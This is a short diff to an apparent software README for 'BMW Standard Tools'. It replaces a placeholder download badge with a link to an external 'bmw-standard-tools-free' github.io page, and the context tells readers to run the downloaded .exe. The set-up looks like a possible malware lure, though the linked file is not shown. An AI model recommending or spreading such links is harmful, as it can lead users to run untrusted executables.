@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://bmw-standard-tools-free.github.io/.github/)
 
 ## 📸 Overview
 ![bmw-standard-tools-main-interface](https://github.com/user-attachments/assets/57f30961-9e2d-4779-8d93-a22dad014dbf)
